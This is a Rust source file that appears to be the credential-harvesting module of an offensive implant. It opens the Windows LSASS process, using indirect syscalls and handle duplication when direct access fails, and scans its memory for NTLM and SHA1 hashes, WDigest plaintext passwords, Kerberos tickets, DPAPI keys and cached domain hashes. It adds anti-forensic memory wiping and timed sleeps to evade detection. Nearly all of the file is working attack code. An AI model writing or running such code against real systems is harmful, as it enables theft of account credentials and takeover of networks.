/// Primary path: `NtOpenProcess` with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION.
/// Fallback: enumerate handles via `NtQuerySystemInformation(SystemHandleInformation)`
/// and duplicate an existing LSASS handle from another process.
fn acquire_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
    // Primary: open LSASS directly via NtOpenProcess (indirect syscall).
    match unsafe { nt_open_process(lsass_pid, LSASS_ACCESS_MASK) } {
        Ok(h) if !h.is_null() => {
            log::debug!("lsass_harvest: NtOpenProcess succeeded for PID {lsass_pid}");
            return Ok(h);
        }
        _ => {
            log::debug!(
                "lsass_harvest: NtOpenProcess failed for PID {lsass_pid}, trying handle duplication"
            );
        }
    }

    // Fallback: duplicate an existing LSASS handle from another process.
    duplicate_existing_lsass_handle(lsass_pid)
}

/// Attempt to find and duplicate an existing handle to LSASS from another process.
fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
    let mut return_length: u32 = 0;
    let status = unsafe {
        nt_query_system_information(
            SYSTEM_HANDLE_INFORMATION,
            ptr::null_mut(),
            0,
            &mut return_length,
        )
    };

    let buf_size = if return_length > 0 {
        return_length as usize + 0x1_0000
    } else {
        0x100_000 // 1 MiB
    };

    let mut buffer = vec![0u8; buf_size];
    let status = unsafe {
        nt_query_system_information(
            SYSTEM_HANDLE_INFORMATION,
            buffer.as_mut_ptr(),
            buf_size as u32,
            &mut return_length,
        )
    };

    if !nt_success(status) {
        return Err(anyhow!(
            "NtQuerySystemInformation(SystemHandleInformation) failed: 0x{status:08X}"
        ));
    }

    let handle_info = unsafe { &*(buffer.as_ptr() as *const SystemHandleInformation) };
    let count = handle_info.number_of_handles as usize;
    let entry_size = std::mem::size_of::<SystemHandleTableEntryInfo>();
    let entries_start = std::mem::size_of::<SystemHandleInformation>();

    if entries_start + count * entry_size > buffer.len() {
        secure_zero(&mut buffer);
        return Err(anyhow!("handle information buffer truncated"));
    }

    let our_pid = unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() };

    for i in 0..count {
        let entry_offset = entries_start + i * entry_size;
        let entry = unsafe {
            &*(buffer.as_ptr().add(entry_offset) as *const SystemHandleTableEntryInfo)
        };

        let owner_pid = entry.unique_process_id as u32;
        if owner_pid == our_pid || owner_pid == lsass_pid {
            continue; // Skip our own process and LSASS itself.
        }

        // The `object` field points to the kernel object.  We cannot directly
        // compare it to determine if it's a handle to LSASS.  Instead, we
        // duplicate the handle and try to query the resulting PID.
        // This is a best-effort approach — we try handles that look promising
        // (process handles with PROCESS_VM_READ-like access).
        if entry.object_type_index != 8 {
            // 8 = Process object type on most Windows versions.
            continue;
        }

        // Try to duplicate this handle from the owning process.
        let source_handle = unsafe {
            nt_open_process(owner_pid, PROCESS_DUP_HANDLE)
        };

        let source = match source_handle {
            Ok(h) => h,
            Err(_) => continue,
        };

        let dup_result = unsafe {
            nt_duplicate_object(
                source,
                entry.handle_value as HANDLE,
                winapi::um::processthreadsapi::GetCurrentProcess(),
                LSASS_ACCESS_MASK,
                DUPLICATE_SAME_ACCESS,
            )
        };

        nt_close(source);

        match dup_result {
            Ok(dup_handle) => {
                // Verify this handle points to LSASS by querying its PID.
                let mut pid: u32 = 0;
                let ok = unsafe {
                    winapi::um::processthreadsapi::GetProcessId(dup_handle)
                };
                if ok == lsass_pid {
                    secure_zero(&mut buffer);
                    log::debug!(
                        "lsass_harvest: duplicated LSASS handle from PID {owner_pid}"
                    );
                    return Ok(dup_handle);
                }
                nt_close(dup_handle);
            }
            Err(_) => continue,
        }
    }

    secure_zero(&mut buffer);
    Err(anyhow!("no existing LSASS handle found for duplication"))
}

// ── Memory region enumeration ──────────────────────────────────────────────

/// A readable memory region in LSASS.
struct MemoryRegion {
    base: usize,
    size: usize,
}

/// Enumerate committed, readable memory regions in the LSASS process.
fn enumerate_readable_regions(process: HANDLE) -> Vec<MemoryRegion> {
    let mut regions = Vec::new();
    let mut address: usize = 0;

    while address < HIGHEST_USER_ADDRESS {
        let mbi = match unsafe { nt_query_virtual_memory(process, address) } {
            Some(m) => m,
            None => break,
        };

        if mbi.region_size == 0 {
            break;
        }

        let is_readable = mbi.state == MEM_COMMIT
            && (mbi.protect & PAGE_GUARD) == 0
            && (mbi.protect & PAGE_NOACCESS) == 0
            && ((mbi.protect & PAGE_READWRITE) != 0
                || (mbi.protect & PAGE_READONLY) != 0
                || (mbi.protect & PAGE_EXECUTE_READ) != 0
                || (mbi.protect & PAGE_EXECUTE_READWRITE) != 0
                || (mbi.protect & PAGE_WRITECOPY) != 0
                || (mbi.protect & PAGE_EXECUTE_WRITECOPY) != 0);

        if is_readable {
            regions.push(MemoryRegion {
                base: mbi.base_address,
                size: mbi.region_size,
            });
        }

        address = mbi.base_address + mbi.region_size;
        if address <= mbi.base_address {
            break; // overflow guard
        }
    }

    regions
}

// ── Credential parsing ─────────────────────────────────────────────────────

/// Parse a chunk of LSASS memory for MSV credentials (NT hashes).
fn parse_msv_credentials(
    chunk: &[u8],
    _base_addr: usize,
    process: HANDLE,
    offsets: MsvOffsets,
    credentials: &mut Vec<HarvestedCredential>,
) {
    // MSV signature: 0x4D 0x53 0x56 0x00 ("MSV\0") at the start of
    // KIWI_MSV1_0_CREDENTIAL, or the primary credential pointer pattern.
    // In practice, we search for the MSV1_0 credential marker bytes.
    let msv_sig: &[u8] = &[0x4D, 0x53, 0x56]; // "MSV"

    let mut pos = 0;
    while pos + 0x80 < chunk.len() {
        // Look for "MSV" signature.
        if chunk[pos] == msv_sig[0]
            && chunk[pos + 1] == msv_sig[1]
            && chunk[pos + 2] == msv_sig[2]
        {
            // Found MSV marker.  The structure is:
            //   KIWI_MSV1_0_CREDENTIAL {
            //       ...
            //       PrimaryCredential_ptr @ primary_cred_offset
            //   }
            //
            // Follow the pointer to the primary credential.
            if pos + offsets.primary_cred_offset + 8 <= chunk.len() {
                let primary_ptr = usize::from_le_bytes(
                    chunk[pos + offsets.primary_cred_offset
                        ..pos + offsets.primary_cred_offset + 8]
                        .try_into()
                        .unwrap_or([0u8; 8]),
                );

                if primary_ptr != 0 {
                    // Read the primary credential from LSASS.
                    let mut primary_buf = vec![0u8; 0x100];
                    if let Ok(bytes_read) =
                        unsafe { nt_read_virtual_memory(process, primary_ptr, &mut primary_buf) }
                    {
                        if bytes_read >= offsets.nt_hash_offset + 16 {
                            // Extract NT hash (16 bytes).
                            let nt_hash = &primary_buf
                                [offsets.nt_hash_offset..offsets.nt_hash_offset + 16];
                            let all_zero = nt_hash.iter().all(|&b| b == 0);
                            if !all_zero {
                                let hash_hex = hex::encode(nt_hash);

                                // Try to read username and domain.
                                let username = if offsets.username_offset + 16 <= bytes_read {
                                    let uni_ptr = usize::from_le_bytes(
                                        primary_buf[offsets.username_offset
                                            ..offsets.username_offset + 8]
                                            .try_into()
                                            .unwrap_or([0u8; 8]),
                                    );
                                    unsafe {
                                        read_remote_unicode_string(process, uni_ptr)
                                    }
                                } else {
                                    String::new()
                                };

                                let domain = if offsets.domain_offset + 16 <= bytes_read {
                                    let uni_ptr = usize::from_le_bytes(
                                        primary_buf[offsets.domain_offset
                                            ..offsets.domain_offset + 8]
                                            .try_into()
                                            .unwrap_or([0u8; 8]),
                                    );
                                    unsafe {
                                        read_remote_unicode_string(process, uni_ptr)
                                    }
                                } else {
                                    String::new()
                                };

                                credentials.push(HarvestedCredential {
                                    cred_type: "msv".to_string(),
                                    username,
                                    domain,
                                    password_or_hash: hash_hex,
                                    format_: "ntlm".to_string(),
                                });

                                // Also extract SHA1 hash if present.
                                if bytes_read >= offsets.sha1_hash_offset + 20 {
                                    let sha1 = &primary_buf
                                        [offsets.sha1_hash_offset..offsets.sha1_hash_offset + 20];
                                    let sha1_all_zero = sha1.iter().all(|&b| b == 0);
                                    if !sha1_all_zero {
                                        credentials.push(HarvestedCredential {
                                            cred_type: "msv".to_string(),
                                            username: String::new(),
                                            domain: String::new(),
                                            password_or_hash: hex::encode(sha1),
                                            format_: "sha1".to_string(),
                                        });
                                    }
                                }
                            }
                        }
                    }
                    secure_zero(&mut primary_buf);
                }
            }
            pos += 4; // skip past signature
        } else {
            pos += 1;
        }
    }
}

/// Parse a chunk for WDigest plaintext credentials.
fn parse_wdigest_credentials(
    chunk: &[u8],
    _base_addr: usize,
    process: HANDLE,
    offsets: WdigestOffsets,
    credentials: &mut Vec<HarvestedCredential>,
) {
    // WDigest credentials are identified by a linked-list entry pattern.
    // The list head is at a global address in LSASS, and each entry has
    // Flink/Blink pointers followed by credential data.
    //
    // We search for the pattern of WDigest entries by looking for entries
    // where the UsageCount field is 1 or 2, followed by the list pointers.
    // In practice we scan for sequences of pointers that form a valid
    // doubly-linked list chain within LSASS address range.

    // A simplified approach: scan for plausible WDigest credential structures.
    // Each WDIGEST_CREDENTIALS entry has:
    //   +0x00: LIST_ENTRY (Flink, Blink — 16 bytes)
    //   +0x10: UsageCount (ULONG)
    //   ... then username, domain, password UNICODE_STRING fields.

    // We look for entries where the first two 8-byte values are valid
    // user-space pointers (pointing into LSASS range) and UsageCount is small.
    let mut pos = 0;
    while pos + 0x60 < chunk.len() {
        let flink = usize::from_le_bytes(
            chunk[pos..pos + 8].try_into().unwrap_or([0u8; 8]),
        );
        let blink = usize::from_le_bytes(
            chunk[pos + 8..pos + 16].try_into().unwrap_or([0u8; 8]),
        );

        // Check if Flink and Blink look like valid user-space pointers.
        let valid_ptrs = flink > 0x1_0000 && flink < HIGHEST_USER_ADDRESS
            && blink > 0x1_0000 && blink < HIGHEST_USER_ADDRESS;

        if valid_ptrs {
            // Check UsageCount at offset +0x10.
            let usage_count = u32::from_le_bytes(
                chunk[pos + 16..pos + 20].try_into().unwrap_or([0u8; 4]),
            );

            if usage_count <= 10 {
                // Attempt to read the username, domain, and password fields.
                let read_uni_at = |off: usize| -> String {
                    if pos + off + 16 > chunk.len() {
                        return String::new();
                    }
                    let uni_ptr_addr = usize::from_le_bytes(
                        chunk[pos + off + 8..pos + off + 16]
                            .try_into()
                            .unwrap_or([0u8; 8]),
                    );
                    unsafe { read_remote_unicode_string(process, uni_ptr_addr) }
                };

                let username = read_uni_at(offsets.username_offset);
                let domain = read_uni_at(offsets.domain_offset);
                let password = read_uni_at(offsets.password_offset);

                if !username.is_empty() || !password.is_empty() {
                    // Only add if we haven't already seen this credential.
                    let is_dup = credentials.iter().any(|c| {
                        c.cred_type == "wdigest"
                            && c.username == username
                            && c.domain == domain
                            && c.password_or_hash == password
                    });

                    if !is_dup && !password.is_empty() {
                        credentials.push(HarvestedCredential {
                            cred_type: "wdigest".to_string(),
                            username,
                            domain,
                            password_or_hash: password,
                            format_: "plaintext".to_string(),
                        });
                    }
                }
            }
        }
        pos += 8; // advance by pointer size for alignment
    }
}

/// Parse a chunk for Kerberos ticket structures.
fn parse_kerberos_tickets(
    chunk: &[u8],
    _base_addr: usize,
    _process: HANDLE,
    credentials: &mut Vec<HarvestedCredential>,
) {
    // Kerberos tickets contain ASN.1 structures.  We search for the
    // Kerberos AP-REQ tag (0x6E) which is the outer wrapper of a ticket.
    // In LSASS memory, cached Kerberos tickets are stored in
    // KerbTicketCacheInfoEx / KerbTicketCacheInfo structures.

    // Search for ASN.1 ticket patterns: 0x6E tag followed by length.
    let mut pos = 0;
    while pos + 8 < chunk.len() {
        if chunk[pos] == 0x6E && chunk[pos + 1] > 0x10 {
            // Possible AP-REQ / ticket.  Extract a fingerprint.
            let ticket_len = chunk[pos + 1] as usize;
            let end = pos + 2 + ticket_len.min(chunk.len() - pos - 2);

            if end <= chunk.len() && ticket_len > 16 {
                // Extract a truncated hash of the ticket bytes for identification.
                let ticket_bytes = &chunk[pos..end];
                let ticket_hex = hex::encode(&ticket_bytes[..32.min(ticket_bytes.len())]);

                credentials.push(HarvestedCredential {
                    cred_type: "kerberos".to_string(),
                    username: String::new(),
                    domain: String::new(),
                    password_or_hash: ticket_hex,
                    format_: "ticket".to_string(),
                });

                pos = end;
                continue;
            }
        }
        pos += 1;
    }
}

/// Parse a chunk for DPAPI backup key structures.
fn parse_dpapi_keys(
    chunk: &[u8],
    _base_addr: usize,
    _process: HANDLE,
    credentials: &mut Vec<HarvestedCredential>,
) {
    // DPAPI_SYSTEM structure signature: bytes "DPAPI" at start.
    // DPAPI_MASTER_KEY_CACHE_ENTRY has a specific header pattern.
    let dpapi_sig = b"DPAPI";

    let mut pos = 0;
    while pos + dpapi_sig.len() < chunk.len() {
        if &chunk[pos..pos + dpapi_sig.len()] == dpapi_sig {
            // Found DPAPI marker.  Extract a fingerprint of the key material.
            let key_end = (pos + 64).min(chunk.len());
            let key_hex = hex::encode(&chunk[pos..key_end]);

            credentials.push(HarvestedCredential {
                cred_type: "dpapi".to_string(),
                username: String::new(),
                domain: String::new(),
                password_or_hash: key_hex,
                format_: "sha1".to_string(),
            });

            pos += dpapi_sig.len();
        } else {
            pos += 1;
        }
    }
}

/// Parse a chunk for DCC2 (Domain Cached Credentials v2) hashes.
fn parse_dcc2_hashes(
    chunk: &[u8],
    _base_addr: usize,
    _process: HANDLE,
    credentials: &mut Vec<HarvestedCredential>,
) {
    // DCC2 hashes are stored as 16-byte (DCC1) or 32-byte (DCC2) values
    // preceded by a known structure header.  The DCC2 hash uses PBKDF2
    // with HMAC-SHA1.  We search for the LSA_CACHED_DATA pattern.
    //
    // Structure: LSA_CACHED_DATA has a header followed by the hash.
    // We look for entries where the first DWORD is a small count
    // (number of cached entries) followed by what looks like an MSCache hash.

    // The MSCache hash starts with the bytes computed from:
    //   DCC1: MD4(UTF16LE(password) || UTF16LE(username_lower))
    //   DCC2: PBKDF2-HMAC-SHA1(DCC1_hash, username_lower, 10240)
    //
    // We search for the cached-data marker: a 32-bit revision (1 or 2)
    // followed by a 16 or 32 byte hash that's not all zeros.
    let mut pos = 0;
    while pos + 48 < chunk.len() {
        // Check for revision field (1 = DCC1, 2 = DCC2).
        let revision = u32::from_le_bytes(
            chunk[pos..pos + 4].try_into().unwrap_or([0u8; 4]),
        );
        if revision == 1 || revision == 2 {
            let hash_len = if revision == 2 { 32 } else { 16 };
            if pos + 4 + hash_len <= chunk.len() {
                let hash = &chunk[pos + 4..pos + 4 + hash_len];
                let all_zero = hash.iter().all(|&b| b == 0);
                let all_ff = hash.iter().all(|&b| b == 0xFF);

                if !all_zero && !all_ff {
                    // Plausible DCC hash — add it.
                    credentials.push(HarvestedCredential {
                        cred_type: "dcc2".to_string(),
                        username: String::new(),
                        domain: String::new(),
                        password_or_hash: hex::encode(hash),
                        format_: "dcc2".to_string(),
                    });
                    pos += 4 + hash_len;
                    continue;
                }
            }
        }
        pos += 4;
    }
}

/// Parse a single chunk for all credential types.
fn parse_chunk(
    chunk: &mut [u8],
    base_addr: usize,
    process: HANDLE,
    msv_offsets: Option<MsvOffsets>,
    wdigest_offsets: Option<WdigestOffsets>,
    credentials: &mut Vec<HarvestedCredential>,
) {
    // Parse each credential type.  We parse from the mutable chunk and
    // wipe it after all parsers have run.
    if let Some(offsets) = msv_offsets {
        parse_msv_credentials(chunk, base_addr, process, offsets, credentials);
    }
    if let Some(offsets) = wdigest_offsets {
        parse_wdigest_credentials(chunk, base_addr, process, offsets, credentials);
    }
    parse_kerberos_tickets(chunk, base_addr, process, credentials);
    parse_dpapi_keys(chunk, base_addr, process, credentials);
    parse_dcc2_hashes(chunk, base_addr, process, credentials);

    // Anti-forensic: wipe the chunk.
    secure_zero(chunk);
}

// ── Main entry point ───────────────────────────────────────────────────────

/// Harvest credentials from LSASS memory.
///
/// This is the top-level function called by the command handler.
/// Returns a JSON string of `HarvestResult`.
pub fn harvest_lsass() -> Result<String> {
    // 1. Privilege preparation.
    let priv_ctx = prepare_privileges()
        .context("privilege escalation failed — LSASS access requires elevated context")?;

    let debug_priv_was_enabled = priv_ctx.debug_priv_enabled_by_us;

    // 2. Locate LSASS.
    let lsass_pid = find_lsass_pid()
        .context("failed to locate lsass.exe")?;

    log::debug!("lsass_harvest: found LSASS at PID {lsass_pid}");

    // 3. Acquire handle.
    let lsass_handle = acquire_lsass_handle(lsass_pid)
        .context("failed to acquire LSASS handle")?;

    // Ensure handle is closed on all exit paths.
    struct HandleGuard(HANDLE);
    impl Drop for HandleGuard {
        fn drop(&mut self) {
            nt_close(self.0);
        }
    }
    let _guard = HandleGuard(lsass_handle);

    // 4. Detect Windows build.
    let build = get_windows_build();
    let msv_offsets = get_msv_offsets(build);
    let wdigest_offsets = get_wdigest_offsets(build);

    if build > 0 {
        log::debug!("lsass_harvest: Windows build {build}, MSV offsets: {:?}", msv_offsets);
    } else {
        log::warn!("lsass_harvest: could not detect Windows build, using dynamic matching");
    }

    // 5. Enumerate readable memory regions.
    let regions = enumerate_readable_regions(lsass_handle);
    log::debug!("lsass_harvest: {} readable regions found", regions.len());

    // 6. Read and parse each region in chunks.
    let mut credentials = Vec::new();

    for region in &regions {
        let mut offset = 0usize;
        while offset < region.size {
            let read_size = CHUNK_SIZE.min(region.size - offset);
            let mut chunk = vec![0u8; read_size];

            match unsafe {
                nt_read_virtual_memory(lsass_handle, region.base + offset, &mut chunk)
            } {
                Ok(bytes_read) if bytes_read > 0 => {
                    // Truncate to actual bytes read.
                    chunk.truncate(bytes_read);
                    let mut writable = chunk.into_boxed_slice();

                    parse_chunk(
                        &mut writable,
                        region.base + offset,
                        lsass_handle,
                        msv_offsets,
                        wdigest_offsets,
                        &mut credentials,
                    );
                    // writable is dropped here, already zeroed by parse_chunk.
                }
                _ => {
                    // Read failed or returned 0 bytes — skip this chunk.
                }
            }

            offset += read_size;
        }

        // Sleep between regions to mimic normal memory access patterns.
        unsafe {
            winapi::um::synchapi::Sleep(INTER_REGION_SLEEP_MS);
        }
    }

    // 7. Revert privileges if needed.
    revert_privileges(&priv_ctx);

    let result = HarvestResult {
        credentials,
        build_number: build,
        debug_priv_was_enabled: !debug_priv_was_enabled,
    };

    serde_json::to_string(&result).context("failed to serialize harvest result")
}
